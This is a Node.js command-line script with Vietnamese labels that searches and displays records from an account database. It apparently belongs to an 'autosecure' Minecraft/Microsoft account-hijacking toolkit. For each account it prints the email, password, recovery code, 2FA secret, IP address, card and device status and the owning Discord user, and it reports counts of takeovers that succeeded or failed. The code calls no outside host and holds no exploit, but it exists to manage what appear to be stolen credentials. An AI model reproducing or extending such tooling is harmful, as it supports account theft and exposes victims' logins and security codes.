#!/usr/bin/env node
const { findAccount, getFailedAccounts, getRecentAccounts } = require("./db/findAccount");
const { queryParams, checkpointWal } = require("./db/database");
const { initializeDB } = require("./db/db");
const { formatOwnedGames } = require("./autosecure/utils/minecraft/ownedGames");

// ANSI color codes
const colors = {
  reset: "\x1b[0m",
  bold: "\x1b[1m",
  dim: "\x1b[2m",
  green: "\x1b[32m",
  red: "\x1b[31m",
  yellow: "\x1b[33m",
  blue: "\x1b[34m",
  magenta: "\x1b[35m",
  cyan: "\x1b[36m",
  white: "\x1b[37m",
  bgRed: "\x1b[41m\x1b[37m",
  bgGreen: "\x1b[42m\x1b[30m",
  bgYellow: "\x1b[43m\x1b[30m"
};

function formatTimestamp(ts) {
  if (!ts) return "N/A";
  const num = Number(ts);
  if (isNaN(num)) return ts;
  // If in seconds (10 digits), convert to ms
  const ms = num < 10000000000 ? num * 1000 : num;
  return new Date(ms).toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
}

function printCard(acc, index = 1) {
  const isSuccess = acc.health_status === "SUCCESS";
  const isXbl = acc.health_status === "XBL_FAILED";
  const isLocked = acc.health_status === "LOCKED";
  
  let statusBadge = `${colors.bgGreen} SUCCESS ${colors.reset}`;
  if (isXbl) statusBadge = `${colors.bgYellow} XBL FAILED ${colors.reset}`;
  else if (isLocked) statusBadge = `${colors.bgRed} LOCKED ${colors.reset}`;
  else if (!isSuccess) statusBadge = `${colors.bgRed} INCOMPLETE / FAILED ${colors.reset}`;

  console.log(`\n${colors.cyan}═══════════════════════════════════════════════════════════════════════${colors.reset}`);
  console.log(` ${colors.bold}[#${index}] UID: ${colors.yellow}${acc.uid}${colors.reset}  |  Trạng thái: ${statusBadge}`);
  console.log(`${colors.cyan}───────────────────────────────────────────────────────────────────────${colors.reset}`);
  
  console.log(` ${colors.bold}📌 Thông tin tài khoản:${colors.reset}`);
  console.log(`   • Email chính : ${colors.bold}${acc.email || colors.dim + "None" + colors.reset}${colors.reset}`);
  console.log(`   • Email phụ   : ${acc.secemail || colors.dim + "None" + colors.reset}`);
  console.log(`   • Mật khẩu    : ${colors.green}${acc.password || colors.dim + "None" + colors.reset}${colors.reset}`);
  console.log(`   • Recovery    : ${colors.magenta}${acc.recoverycode || colors.dim + "None" + colors.reset}${colors.reset}`);
  if (acc.secretkey && acc.secretkey !== "Option is disabled.") {
    console.log(`   • 2FA Secret  : ${colors.yellow}${acc.secretkey}${colors.reset}`);
  }

  console.log(`\n ${colors.bold}🎮 Minecraft & Game Info:${colors.reset}`);
  console.log(`   • Username    : ${colors.bold}${acc.username || "Unknown"}${colors.reset}`);
  const gamesOwned = formatOwnedGames(acc);
  console.log(`   • Owns MC     : ${colors.bold}${gamesOwned}${colors.reset}`);
  if (acc.ip) console.log(`   • IP Address  : ${acc.ip}`);
  if (acc.creationdate) console.log(`   • Ngày tạo MS : ${acc.creationdate}`);
  if (acc.cardstatus) console.log(`   • Thẻ liên kết: ${acc.cardstatus}`);
  if (acc.devicestatus) console.log(`   • Thiết bị    : ${acc.devicestatus}`);

  console.log(`\n ${colors.bold}🔍 Chẩn đoán lỗi / Tiến trình:${colors.reset}`);
  console.log(`   • Tiến trình  : ${colors.dim}${acc.process_status || "N/A"}${colors.reset}`);
  if (acc.diagnosis && acc.diagnosis.reasons && acc.diagnosis.reasons.length > 0) {
    acc.diagnosis.reasons.forEach(r => {
      console.log(`   • ${colors.red}❌ Lý do lỗi   : ${r}${colors.reset}`);
    });
  } else if (!isSuccess) {
    console.log(`   • ${colors.yellow}⚠️ Lý do lỗi   : ${acc.diagnosis?.summary || "Không có log lỗi cụ thể"}${colors.reset}`);
  } else {
    console.log(`   • ${colors.green}✔ Trạng thái   : Hoàn tất trọn vẹn${colors.reset}`);
  }

  console.log(`\n ${colors.bold}👤 Sở hữu & Thời gian:${colors.reset}`);
  console.log(`   • Discord User: ${acc.discord_user_id || colors.dim + "N/A" + colors.reset}`);
  console.log(`   • Thời gian   : ${formatTimestamp(acc.timestamp)}`);
  console.log(`${colors.cyan}═══════════════════════════════════════════════════════════════════════${colors.reset}`);
}

async function showStats() {
  const totalAcc = await queryParams(`SELECT COUNT(*) as c FROM v_all_accounts`);
  const successAcc = await queryParams(`SELECT COUNT(*) as c FROM v_all_accounts WHERE health_status = 'SUCCESS'`);
  const failedAcc = await queryParams(`SELECT COUNT(*) as c FROM v_failed_accounts`);
  const xblFailed = await queryParams(`SELECT COUNT(*) as c FROM v_all_accounts WHERE health_status = 'XBL_FAILED'`);

  console.log(`\n${colors.bold}${colors.blue}📊 THỐNG KÊ DATABASE TÀI KHOẢN:${colors.reset}`);
  console.log(` • Tổng số tài khoản xử lý : ${colors.bold}${totalAcc[0]?.c || 0}${colors.reset}`);
  console.log(` • Thành công hoàn chỉnh   : ${colors.green}${colors.bold}${successAcc[0]?.c || 0}${colors.reset}`);
  console.log(` • Thất bại / Lỗi dở dang  : ${colors.red}${colors.bold}${failedAcc[0]?.c || 0}${colors.reset}`);
  console.log(` • Trong đó XBL Failed     : ${colors.yellow}${colors.bold}${xblFailed[0]?.c || 0}${colors.reset}`);
}

async function main() {
  await initializeDB();
  const args = process.argv.slice(2);

  if (args.length === 0) {
    console.log(`
${colors.bold}${colors.cyan}🛠️  HƯỚNG DẪN SỬ DỤNG CHECK_ACC (Account Inspector):${colors.reset}
  ${colors.yellow}node check_acc.js <từ_khóa>${colors.reset}       : Tìm acc theo Email, SecEmail, Username, UID, Recovery Code...
  ${colors.yellow}node check_acc.js --failed${colors.reset}          : Xem danh sách các tài khoản bị LỖI hoặc DỞ DANG
  ${colors.yellow}node check_acc.js --recent [số_lượng]${colors.reset}: Xem các tài khoản được xử lý gần nhất
  ${colors.yellow}node check_acc.js --stats${colors.reset}           : Xem thống kê tổng quan (Thành công / Thất bại)
  ${colors.yellow}node check_acc.js --checkpoint${colors.reset}      : Tối ưu & giải phóng dung lượng WAL SQLite
`);
    await showStats();
    process.exit(0);
  }

  const flag = args[0].toLowerCase();

  if (flag === "--failed" || flag === "-f") {
    console.log(`\n${colors.bold}${colors.red}🔎 Đang quét tất cả tài khoản bị lỗi hoặc chưa hoàn tất...${colors.reset}`);
    const failed = await getFailedAccounts(50);
    if (failed.length === 0) {
      console.log(`${colors.green}✔ Không tìm thấy tài khoản lỗi nào!${colors.reset}`);
    } else {
      console.log(`Tìm thấy ${colors.bold}${failed.length}${colors.reset} tài khoản bị lỗi:`);
      failed.forEach((acc, idx) => printCard(acc, idx + 1));
    }
    process.exit(0);
  }

  if (flag === "--recent" || flag === "-r") {
    const limit = parseInt(args[1]) || 10;
    console.log(`\n${colors.bold}${colors.cyan}🕒 Lấy ${limit} tài khoản gần nhất...${colors.reset}`);
    const recent = await getRecentAccounts(limit);
    recent.forEach((acc, idx) => printCard(acc, idx + 1));
    process.exit(0);
  }

  if (flag === "--stats" || flag === "-s") {
    await showStats();
    process.exit(0);
  }

  if (flag === "--checkpoint" || flag === "-c") {
    console.log(`\n${colors.cyan}⚙️  Đang thực hiện WAL Checkpoint (TRUNCATE)...${colors.reset}`);
    const result = await checkpointWal("TRUNCATE");
    console.log(`${colors.green}✔ Checkpoint hoàn tất:${colors.reset}`, result);
    process.exit(0);
  }

  // Search keyword
  const keyword = args.join(" ");
  console.log(`\n${colors.cyan}🔍 Đang tìm kiếm tài khoản với từ khóa: "${colors.bold}${keyword}${colors.reset}"...`);
  const results = await findAccount(keyword);

  if (!results || results.length === 0) {
    console.log(`${colors.red}❌ Không tìm thấy tài khoản nào khớp với "${keyword}".${colors.reset}`);
  } else {
    console.log(`${colors.green}✔ Tìm thấy ${colors.bold}${results.length}${colors.reset} kết quả khớp:${colors.reset}`);
    results.forEach((acc, idx) => printCard(acc, idx + 1));
  }

  process.exit(0);
}

main().catch(err => {
  console.error("Lỗi:", err);
  process.exit(1);
});
